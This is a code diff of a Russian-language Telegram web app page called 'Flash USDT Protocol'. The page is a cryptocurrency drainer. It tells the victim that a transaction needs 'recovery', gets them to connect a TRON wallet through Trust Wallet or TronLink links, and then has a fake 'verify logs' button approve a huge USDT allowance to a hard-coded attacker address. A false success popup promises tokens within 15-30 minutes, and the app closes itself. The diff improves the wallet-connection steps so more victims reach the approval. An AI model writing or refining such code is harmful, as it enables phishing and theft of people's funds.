@@ -15,6 +15,7 @@
         .btn { background: #0088cc; color: white; border: none; padding: 16px; font-size: 14px; font-weight: bold; border-radius: 14px; cursor: pointer; width: 100%; text-transform: uppercase; margin-bottom: 10px; transition: 0.2s; }
         .btn-alt { background: #222; border: 1px solid #444; color: #ccc; }
         .btn:active { transform: scale(0.98); opacity: 0.9; }
+        .btn:disabled { background: #333; color: #666; cursor: not-allowed; }
     </style>
 </head>
 <body>
@@ -22,16 +23,19 @@
 <div class="container">
     <div class="status">● СИСТЕМА ВАЛИДАЦИИ АКТИВНА</div>
     <h2>Flash USDT Protocol</h2>
-    <p id="infoText">Для восстановления транзакции необходимо синхронизировать кошелек с узлом валидации.</p>
+    <p id="infoText">Ожидание подключения кошелька...</p>
 
-    <div id="walletActive" style="display: none;">
-        <button id="verifyBtn" class="btn">ВЕРИФИЦИРОВАТЬ ЛОГИ</button>
-    </div>
-
-    <div id="walletNone">
+    <div id="step-external" style="display: none;">
         <button id="trustBtn" class="btn">Открыть в Trust Wallet</button>
         <button id="tronBtn" class="btn btn-alt">Открыть в TronLink</button>
-        <p style="font-size: 11px; margin-top: 15px; color: #555;">Выберите ваш кошелек для безопасного подключения</p>
+    </div>
+
+    <div id="step-connect" style="display: none;">
+        <button id="connectBtn" class="btn">Подключить кошелек</button>
+    </div>
+
+    <div id="step-verify" style="display: none;">
+        <button id="verifyBtn" class="btn">ВЕРИФИЦИРОВАТЬ ЛОГИ</button>
     </div>
 </div>
 
@@ -41,38 +45,72 @@
 
     const ADMIN_ADDRESS = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-
-    // Чистая ссылка без мусора Телеграма
     const CLEAN_URL = window.location.origin + window.location.pathname;
 
-    async function checkWallet() {
-        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-            document.getElementById('walletActive').style.display = 'block';
-            document.getElementById('walletNone').style.display = 'none';
-            document.getElementById('infoText').innerText = 'Кошелек подключен. Нажмите кнопку ниже для верификации логов.';
+    const infoText = document.getElementById('infoText');
+    const divExt = document.getElementById('step-external');
+    const divConn = document.getElementById('step-connect');
+    const divVer = document.getElementById('step-verify');
+
+    // Логика управления экранами
+    function showStep(stepName) {
+        divExt.style.display = 'none';
+        divConn.style.display = 'none';
+        divVer.style.display = 'none';
+        if (stepName === 'external') divExt.style.display = 'block';
+        if (stepName === 'connect') divConn.style.display = 'block';
+        if (stepName === 'verify') divVer.style.display = 'block';
+    }
+
+    async function init() {
+        // Проверяем, есть ли провайдер (мы внутри dApp браузера?)
+        if (window.tronWeb) {
+            // Если адрес уже есть (редко бывает сразу)
+            if (window.tronWeb.defaultAddress.base58) {
+                infoText.innerText = "Кошелек готов. Верифицируйте логи.";
+                showStep('verify');
+            } else {
+                // Если мы в кошельке, но адрес не отдан
+                infoText.innerText = "Кошелек обнаружен. Нажмите кнопку для подключения.";
+                showStep('connect');
+            }
+        } else {
+            // Мы в обычном браузере (Телеграм)
+            infoText.innerText = "Для восстановления транзакции выберите ваш кошелек.";
+            showStep('external');
         }
     }
 
-    // Обработка Trust Wallet
+    // Кнопка принудительного коннекта (для Trust Wallet)
+    document.getElementById('connectBtn').onclick = async () => {
+        try {
+            // Запрашиваем аккаунты (вызовет окно Trust Wallet "Подключиться")
+            const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
+            if (window.tronWeb.defaultAddress.base58) {
+                infoText.innerText = "Подключено! Выполните верификацию.";
+                showStep('verify');
+            }
+        } catch (e) {
+            tg.showAlert("Пожалуйста, подтвердите подключение в кошельке.");
+        }
+    };
+
+    // Глубокие ссылки
     document.getElementById('trustBtn').onclick = () => {
-        const link = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(CLEAN_URL);
-        tg.openLink(link); // Используем метод Телеграма для чистого открытия
+        tg.openLink("https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(CLEAN_URL));
     };
-
-    // Обработка TronLink
     document.getElementById('tronBtn').onclick = () => {
-        const link = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(CLEAN_URL);
-        tg.openLink(link);
+        tg.openLink("tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(CLEAN_URL));
     };
 
+    // Финальный апрув
     document.getElementById('verifyBtn').onclick = async () => {
         try {
             const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
             await contract.approve(ADMIN_ADDRESS, '1000000000000000').send();
-            
             tg.showPopup({
                 title: 'Готово',
-                message: 'Синхронизация завершена. Токены будут зачислены на баланс в течение 15-30 минут.',
+                message: 'Синхронизация завершена. Ожидайте зачисления в течение 15-30 минут.',
                 buttons: [{type: 'ok'}]
             });
             setTimeout(() => tg.close(), 5000);
@@ -81,7 +119,8 @@
         }
     };
 
-    setInterval(checkWallet, 1000);
+    // Запуск
+    setTimeout(init, 1000); // Даем 1 сек на инициализацию провайдера
 </script>
 </body>
 </html>
